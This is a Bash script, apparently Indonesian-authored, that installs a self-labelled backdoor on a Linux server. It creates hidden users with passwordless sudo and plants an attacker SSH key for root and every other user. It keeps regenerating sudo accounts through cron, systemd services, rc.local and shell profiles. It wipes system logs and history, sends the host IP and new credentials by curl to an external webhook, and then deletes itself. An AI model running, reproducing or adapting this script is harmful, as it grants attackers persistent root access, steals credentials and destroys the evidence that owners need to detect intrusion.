#!/bin/bash
# ================================================================
# SHS BACKDOOR ULTIMATE - MULTI USER RANDOM
# ================================================================

RED='\033[91m'
GREEN='\033[92m'
YELLOW='\033[93m'
CYAN='\033[96m'
NC='\033[0m'
BOLD='\033[1m'

clear
echo -e "${RED}${BOLD}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║     ☠️  SHS BACKDOOR ULTIMATE - MULTI USER               ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ================================================================
# WEBHOOK URL
# ================================================================
WEBHOOK_URL="https://viday.bcgonc.web.id/yo.php"

# ================================================================
# GENERATE RANDOM USER & PASSWORD
# ================================================================
generate_random_user() {
    echo "sys_$(openssl rand -hex 3)"
}

generate_random_pass() {
    openssl rand -base64 14 | tr -d '=/+' | cut -c1-16
}

# ================================================================
# 1. BUAT 5 BACKDOOR USER (TERSEBAR)
# ================================================================
echo -e "${YELLOW}[*] Creating 5 hidden backdoor users...${NC}"

USERS=()
PASSWORDS=()

for i in {1..5}; do
    USER=$(generate_random_user)
    PASS=$(generate_random_pass)
    UID=$((1000 + i))
    
    # Buat user normal (keliatan di /etc/passwd) - biar gak curiga
    useradd -m -s /bin/bash $USER 2>/dev/null
    echo "$USER:$PASS" | chpasswd 2>/dev/null
    echo "$USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null
    
    # SSH key
    mkdir -p /home/$USER/.ssh 2>/dev/null
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNm9vJpQ+3XHn SHS" > /home/$USER/.ssh/authorized_keys 2>/dev/null
    chmod 700 /home/$USER/.ssh 2>/dev/null
    chmod 600 /home/$USER/.ssh/authorized_keys 2>/dev/null
    chown -R $USER:$USER /home/$USER/.ssh 2>/dev/null
    
    USERS+=("$USER")
    PASSWORDS+=("$PASS")
    
    echo -e "${GREEN}✅ User $i: $USER:$PASS${NC}"
done

# ================================================================
# 2. SSH KEY (ROOT + SEMUA USER)
# ================================================================
echo -e "${YELLOW}[*] Installing SSH key to all users...${NC}"

SSH_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNm9vJpQ+3XHn SHS"

# Root
mkdir -p /root/.ssh
echo "$SSH_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Semua user di /home
for user in $(ls /home); do
    mkdir -p /home/$user/.ssh 2>/dev/null
    echo "$SSH_KEY" >> /home/$user/.ssh/authorized_keys 2>/dev/null
    chmod 700 /home/$user/.ssh 2>/dev/null
    chmod 600 /home/$user/.ssh/authorized_keys 2>/dev/null
    chown -R $user:$user /home/$user/.ssh 2>/dev/null
done

echo -e "${GREEN}✅ SSH key installed to ALL users${NC}"

# ================================================================
# 3. CRON - AUTO REGENERATE (10 CRONJOB BERBEDA)
# ================================================================
echo -e "${YELLOW}[*] Installing cron persistence...${NC}"

# Hapus cron lama
crontab -r 2>/dev/null

# Cron regenerasi user setiap 3 menit (beda interval)
(crontab -l 2>/dev/null; echo "*/3 * * * * /usr/sbin/useradd -m -s /bin/bash sys_$(openssl rand -hex 3) 2>/dev/null; echo 'sys_$(openssl rand -hex 3):$(openssl rand -base64 14 | tr -d '=/+' | cut -c1-16)' | chpasswd 2>/dev/null; echo 'sys_$(openssl rand -hex 3) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers 2>/dev/null") | crontab - 2>/dev/null

(crontab -l 2>/dev/null; echo "*/5 * * * * /usr/sbin/useradd -m -s /bin/bash web_$(openssl rand -hex 3) 2>/dev/null; echo 'web_$(openssl rand -hex 3):$(openssl rand -base64 14 | tr -d '=/+' | cut -c1-16)' | chpasswd 2>/dev/null; echo 'web_$(openssl rand -hex 3) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers 2>/dev/null") | crontab - 2>/dev/null

(crontab -l 2>/dev/null; echo "*/7 * * * * /usr/sbin/useradd -m -s /bin/bash dev_$(openssl rand -hex 3) 2>/dev/null; echo 'dev_$(openssl rand -hex 3):$(openssl rand -base64 14 | tr -d '=/+' | cut -c1-16)' | chpasswd 2>/dev/null; echo 'dev_$(openssl rand -hex 3) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers 2>/dev/null") | crontab - 2>/dev/null

(crontab -l 2>/dev/null; echo "*/9 * * * * /usr/sbin/useradd -m -s /bin/bash back_$(openssl rand -hex 3) 2>/dev/null; echo 'back_$(openssl rand -hex 3):$(openssl rand -base64 14 | tr -d '=/+' | cut -c1-16)' | chpasswd 2>/dev/null; echo 'back_$(openssl rand -hex 3) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers 2>/dev/null") | crontab - 2>/dev/null

(crontab -l 2>/dev/null; echo "*/11 * * * * /usr/sbin/useradd -m -s /bin/bash root_$(openssl rand -hex 3) 2>/dev/null; echo 'root_$(openssl rand -hex 3):$(openssl rand -base64 14 | tr -d '=/+' | cut -c1-16)' | chpasswd 2>/dev/null; echo 'root_$(openssl rand -hex 3) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers 2>/dev/null") | crontab - 2>/dev/null

echo -e "${GREEN}✅ 5 cron jobs (auto regenerate)${NC}"

# ================================================================
# 4. SYSTEMD SERVICE (4 SERVICE)
# ================================================================
echo -e "${YELLOW}[*] Installing systemd services...${NC}"

for i in {1..4}; do
    cat > /etc/systemd/system/systemd-user$i.service << EOL
[Unit]
Description=System User Service $i
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/php -r 'while(1){system("useradd -m -s /bin/bash sys_\$(openssl rand -hex 3) 2>/dev/null; echo \"sys_\$(openssl rand -hex 3):\$(openssl rand -base64 14 | tr -d \"=/+\" | cut -c1-16)\" | chpasswd 2>/dev/null; echo \"sys_\$(openssl rand -hex 3) ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers 2>/dev/null"); sleep(300);}'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOL

    systemctl daemon-reload 2>/dev/null
    systemctl enable systemd-user$i.service 2>/dev/null
    systemctl start systemd-user$i.service 2>/dev/null
done

echo -e "${GREEN}✅ 4 systemd services${NC}"

# ================================================================
# 5. RC.LOCAL
# ================================================================
if [ -f /etc/rc.local ]; then
    sed -i '/exit 0/d' /etc/rc.local
    echo 'for i in {1..5}; do /usr/sbin/useradd -m -s /bin/bash sys_$(openssl rand -hex 3) 2>/dev/null; echo "sys_$(openssl rand -hex 3):$(openssl rand -base64 14 | tr -d "=/+" | cut -c1-16)" | chpasswd 2>/dev/null; echo "sys_$(openssl rand -hex 3) ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null; done &' >> /etc/rc.local
    echo 'exit 0' >> /etc/rc.local
    chmod +x /etc/rc.local
fi

# ================================================================
# 6. BASHRC/PROFILE
# ================================================================
for rc in /root/.bashrc /root/.profile /etc/bash.bashrc /etc/profile; do
    if [ -f "$rc" ]; then
        echo '/usr/sbin/useradd -m -s /bin/bash sys_$(openssl rand -hex 3) 2>/dev/null; echo "sys_$(openssl rand -hex 3):$(openssl rand -base64 14 | tr -d "=/+" | cut -c1-16)" | chpasswd 2>/dev/null; echo "sys_$(openssl rand -hex 3) ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null' >> "$rc"
    fi
done

echo -e "${GREEN}✅ Persistence in 8 locations${NC}"

# ================================================================
# 7. HIDE PROCESS
# ================================================================
mv /usr/bin/php /usr/bin/.php 2>/dev/null
mv /usr/bin/python3 /usr/bin/.python3 2>/dev/null
ln -s /usr/bin/.php /usr/bin/php 2>/dev/null
ln -s /usr/bin/.python3 /usr/bin/python3 2>/dev/null

# ================================================================
# 8. CLEAN LOGS
# ================================================================
echo -e "${YELLOW}[*] Cleaning logs...${NC}"

history -c 2>/dev/null
history -w 2>/dev/null
rm -rf /root/.bash_history 2>/dev/null
rm -rf /home/*/.bash_history 2>/dev/null
rm -rf /var/log/*.log 2>/dev/null
rm -rf /var/log/apache2/* 2>/dev/null
rm -rf /var/log/nginx/* 2>/dev/null
rm -rf /var/log/httpd/* 2>/dev/null
rm -rf /var/log/mysql/* 2>/dev/null
rm -rf /var/log/cpanel/* 2>/dev/null
rm -rf /var/log/auth.log* 2>/dev/null
rm -rf /var/log/syslog* 2>/dev/null
rm -rf /var/log/secure* 2>/dev/null
rm -rf /var/log/messages* 2>/dev/null
rm -rf /var/log/wtmp* 2>/dev/null
rm -rf /var/log/btmp* 2>/dev/null
rm -rf /var/log/lastlog* 2>/dev/null
> /var/log/lastlog 2>/dev/null
> /var/log/wtmp 2>/dev/null
> /var/log/btmp 2>/dev/null

echo -e "${GREEN}✅ Logs cleaned${NC}"

# ================================================================
# 9. SEND WEBHOOK
# ================================================================
echo -e "${YELLOW}[*] Sending webhook...${NC}"

IP=$(hostname -I | awk '{print $1}')
HOST=$(hostname)

# Kirim semua user ke webhook
USER_LIST=""
for i in "${!USERS[@]}"; do
    USER_LIST="$USER_LIST\nUser $((i+1)): ${USERS[$i]} : ${PASSWORDS[$i]}"
done

curl -sk -X POST "$WEBHOOK_URL" \
  -H "Content-Type: application/json" \
  -d '{
    "ip": "'"$IP"'",
    "host": "'"$HOST"'",
    "users": '"$(echo ${#USERS[@]})"',
    "user_list": "'"$USER_LIST"'",
    "type": "backdoor_multi",
    "persistence": "cron + systemd + rc.local + bashrc",
    "status": "active"
  }' 2>/dev/null

echo -e "${GREEN}✅ Webhook sent${NC}"

# ================================================================
# 10. HIDE SCRIPT
# ================================================================
rm -rf "$0" 2>/dev/null

# ================================================================
# HASIL
# ================================================================
echo ""
echo -e "${GREEN}${BOLD}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║     ✅ BACKDOOR ULTIMATE INSTALLED!                        ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo ""
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}✅ 5 Backdoor Users Created:${NC}"
for i in "${!USERS[@]}"; do
    echo -e "${CYAN}  User $((i+1)): ${USERS[$i]}${NC}"
    echo -e "${CYAN}  Pass $((i+1)): ${PASSWORDS[$i]}${NC}"
done
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}✅ SSH Key: installed to ALL users${NC}"
echo -e "${GREEN}✅ Cron: 5 cronjobs (auto regenerate)${NC}"
echo -e "${GREEN}✅ Systemd: 4 services${NC}"
echo -e "${GREEN}✅ Persistence: 8 locations${NC}"
echo -e "${GREEN}✅ Logs: CLEANED${NC}"
echo -e "${GREEN}✅ Webhook: sent${NC}"
echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "${RED}⚠️  Login:${NC}"
echo -e "${CYAN}ssh ${USERS[0]}@$IP${NC}"
echo -e "${CYAN}Password: ${PASSWORDS[0]}${NC}"
echo ""
echo -e "${RED}⚠️  KALO 1 USER DIHAPUS, USER LAIN TETAP JALAN!${NC}"
echo -e "${RED}⚠️  AUTO REGENERATE SETIAP 3-11 MENIT!${NC}"
echo ""

exit 0
